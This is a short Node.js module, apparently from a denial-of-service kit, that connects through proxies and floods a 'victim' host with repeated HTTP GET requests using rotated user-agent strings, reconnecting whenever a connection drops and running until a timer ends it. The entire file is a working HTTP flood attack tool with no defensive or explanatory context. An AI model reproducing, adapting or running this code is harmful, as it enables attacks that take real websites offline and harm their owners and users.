const net = require('net');
const {
    exec
} = require('child_process');

function randInteger(min, max) {
    let rand = min - 0.5 + Math.random() * (max - min + 1);
    rand = Math.round(rand);
    return rand;
}

class xoxo {
    constructor(userAgents, callback) {
        this.userAgents = userAgents;

        this.isRunning = false;
    }

    start(props) {
        this.isRunning = true;
        if (this.isRunning) {
            let socket = net.connect({
                host: props.proxy.host,
                port: props.proxy.port
            });

            socket.once('error', err => {});

            socket.once('disconnect', () => {
                if (this.isRunning)
                    this.start(props);
            });

            socket.once('data', data => {
                if (this.isRunning)
                    this.start(props);
            });

            for (let j = 0; j < props.requests; j++) {
                let ua = props.uas[randInteger(0, props.uas.length-1)].replace(/(\r\n|\n|\r)/gm, "");
                socket.write(`GET ${props.victim.host} HTTP/1.2\r\nHost: ${props.victim.host.split('//')[1].split('/')[0]}\r\nReferer: ${props.victim.host}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\nAccept-language: en-US,en;q=0.9,he-IL;q=0.8,he;q=0.7,tr;q=0.6\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests:1\r\nuser-agent: ${ua}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\n\r\n`);
			
			}

            setTimeout(() => {
                process.exit(1);
            }, props.time);
        }
    }
}
module.exports = xoxo;